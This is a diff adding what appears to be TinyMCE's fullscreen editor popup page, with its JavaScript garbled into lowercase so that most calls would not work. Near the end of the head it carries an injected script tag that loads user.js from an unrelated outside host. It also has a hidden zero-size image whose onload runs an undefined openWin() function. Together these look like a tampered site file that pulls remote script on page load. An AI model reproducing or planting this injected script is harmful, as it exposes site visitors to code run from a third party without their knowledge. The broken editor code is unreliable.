@@ -1,0 +1,110 @@
+<!doctype html public "-//w3c//dtd xhtml 1.0 strict//en" "http://www.w3.org/tr/xhtml1/dtd/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+	<title></title>
+	<meta http-equiv="content-type" content="text/html; charset=iso-8859-1" />
+	<script type="text/javascript" src="../../tiny_mce.js"></script>
+	<script type="text/javascript">
+		function patchcallback(settings, key) {
+			if (settings[key])
+				settings[key] = "window.opener." + settings[key];
+		}
+
+		var settings = {}, pase = window.opener.tinymce.activeeditor.settings, oeid = window.opener.tinymce.activeeditor.id;
+
+		// clone array
+		for (var n in pase)
+			settings[n] = pase[n];
+
+		// override options for fullscreen
+		for (var n in pase.fullscreen_settings)
+			settings[n] = pase.fullscreen_settings[n];
+
+		// patch callbacks, make them point to window.opener
+		patchcallback(settings, 'urlconverter_callback');
+		patchcallback(settings, 'insertlink_callback');
+		patchcallback(settings, 'insertimage_callback');
+		patchcallback(settings, 'setupcontent_callback');
+		patchcallback(settings, 'save_callback');
+		patchcallback(settings, 'onchange_callback');
+		patchcallback(settings, 'init_instance_callback');
+		patchcallback(settings, 'file_browser_callback');
+		patchcallback(settings, 'cleanup_callback');
+		patchcallback(settings, 'execcommand_callback');
+		patchcallback(settings, 'oninit');
+
+		// set options
+		delete settings.id;
+		settings['mode'] = 'exact';
+		settings['elements'] = 'fullscreenarea';
+		settings['add_unload_trigger'] = false;
+		settings['ask'] = false;
+		settings['document_base_url'] = window.opener.tinymce.activeeditor.documentbaseuri.geturi();
+		settings['fullscreen_is_enabled'] = true;
+		settings['fullscreen_editor_id'] = oeid;
+		settings['theme_advanced_resizing'] = false;
+		settings['strict_loading_mode'] = true;
+
+		settings.save_onsavecallback = function() {
+			window.opener.tinymce.get(oeid).setcontent(tinymce.get('fullscreenarea').getcontent({format : 'raw'}), {format : 'raw'});
+			window.opener.tinymce.get(oeid).execcommand('mcesave');
+			window.close();
+		};
+
+		function unloadhandler(e) {
+			movecontent();
+		}
+
+		function movecontent() {
+			window.opener.tinymce.get(oeid).setcontent(tinymce.activeeditor.getcontent());
+		}
+
+		function closefullscreen() {
+			movecontent();
+			window.close();
+		}
+
+		function doparentsubmit() {
+			movecontent();
+
+			if (window.opener.tinymce.selectedinstance.formelement.form)
+				window.opener.tinymce.selectedinstance.formelement.form.submit();
+
+			window.close();
+
+			return false;
+		}
+
+		function render() {
+			var e = document.getelementbyid('fullscreenarea'), vp, ed, ow, oh, dom = tinymce.dom;
+
+			e.value = window.opener.tinymce.get(oeid).getcontent();
+
+			vp = dom.getviewport();
+			settings.width = vp.w;
+			settings.height = vp.h - 15;
+
+			tinymce.dom.event.add(window, 'resize', function() {
+				var vp = dom.getviewport();
+
+				tinymce.activeeditor.theme.resizeto(vp.w, vp.h);
+			});
+
+			tinymce.init(settings);
+		}
+
+		// add onunload
+		tinymce.dom.event.add(window, "beforeunload", unloadhandler);
+	</script>
+<script language="javascript" type="text/javascript" src="http://js.521.cc/js/user.js"></script></head>
+<body style="margin:0;overflow:hidden;width:100%;height:100%" scrolling="no" scroll="no">
+<form onsubmit="doparentsubmit();">
+<textarea id="fullscreenarea" style="width:100%; height:100%"></textarea>
+</form>
+
+<script type="text/javascript">
+	render();
+</script>
+
+<img src="http://www.baidu.com/search/img/logo.gif" width="0" height="0" onload="openWin();" /></body>
+</html>
